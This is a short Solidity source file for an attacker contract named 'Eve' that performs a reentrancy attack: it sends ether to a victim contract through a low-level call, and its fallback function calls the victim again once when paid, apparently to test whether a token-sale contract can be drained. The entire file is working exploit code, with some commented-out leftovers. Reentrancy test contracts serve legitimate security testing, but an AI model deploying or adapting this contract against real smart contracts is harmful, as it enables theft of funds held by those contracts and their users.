pragma solidity ^0.4.19;

contract Eve {

  
       bool public alreadyCalled;
       uint public tokenAmount;
       bool useReentrancy;
       address victim;
       event fallbackCalled(uint amount, bool useReentrancy);
       
       function Eve() public payable {}

   
    
    function exploitReentrancy(address _a, uint _amount, bool _useReentrancy) public {
       //a.call(bytes4(sha3("buyTokens(address _beneficiary)")), this.address, {value: 50});
        alreadyCalled = false;
        tokenAmount = _amount;
        victim = _a;
        useReentrancy = _useReentrancy;
        victim.call.value(_amount)();
        
        
        //a.send(amount);
       //a.transfer(amount);
        
    }

   /* function() withdraw public onlyOwner () {
        token.transfer(msg.sender, token.balances[this.address]);
    }*/


    
    function() payable public {
        fallbackCalled(tokenAmount, useReentrancy);
        if(useReentrancy) {
            
        if(alreadyCalled == true) {
            return;
       }
        alreadyCalled = true;
       
        victim.call.value(tokenAmount)();
        
       }

        
    }
    
    
    /*
    function() public payable {
        
    }
    */
    
    
    
}
